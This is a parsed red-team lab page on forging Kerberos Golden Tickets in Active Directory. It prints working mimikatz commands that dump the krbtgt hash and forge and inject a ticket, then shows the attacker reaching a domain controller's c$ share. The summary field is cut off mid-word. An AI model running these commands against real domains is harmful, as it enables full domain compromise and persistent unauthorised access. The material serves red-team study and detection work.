---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Kerberos: Golden Tickets

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-active-directory-kerberos-abuse-kerberos-golden-tickets` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

This lab explores an attack on Active Directory Kerberos Authentication. To be more precise - an attack that forges Kerberos Ticket Granting Tickets \(TGT\) that are used to authenticate users with Kerberos. TGTs are used when requesting Ti

## Preserved Body

````markdown
This lab explores an attack on Active Directory Kerberos Authentication. To be more precise - an attack that forges Kerberos Ticket Granting Tickets \(TGT\) that are used to authenticate users with Kerberos. TGTs are used when requesting Ticket Granting Service \(TGS\) tickets, which means a forged TGT can get us any TGS ticket - hence it's golden.

This attack assumes a Domain Controller compromise where `KRBTGT` account hash will be extracted which is a requirement for a successful Golden Ticket attack.

## Execution

Extracting the krbtgt account's password `NTLM` hash:
```csharp
mimikatz # lsadump::lsa /inject /name:krbtgt
```
![](<../../_assets/kerberos-golden-krbtgt-hash.png>)

Creating a forged golden ticket that automatically gets injected in current logon session's memory:
```text
mimikatz # kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt
```
![](<../../_assets/kerberos-golden-create.png>)

Checking if the ticket got created:

![](<../../_assets/kerberos-golden-klist.png>)

Opening another powershell console with low privileged account and trying to mount a `c$` share of `pc-mantvydas` and `dc-mantvydas` - not surprisingly, returns access denied:

![](<../../_assets/kerberos-golden-denied.png>)

However, switching back to the console the attacker used to create the golden ticket \(local admin\) and again attempting to access `c$` share of the domain controller - this time is a success:

![](<../../_assets/kerberos-golden-granted.png>)

## Observations

![](<../../_assets/kerberos-golden-logon.png>)

![](<../../_assets/kerberos-golden-share.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/kerberos-golden-tickets.md)

## Evidence Excerpt

```text
_asset_filenames:
- kerberos-golden-create.png
- kerberos-golden-denied.png
- kerberos-golden-granted.png
- kerberos-golden-klist.png
- kerberos-golden-krbtgt-hash.png
- kerberos-golden-logon.png
- kerberos-golden-share.png
```
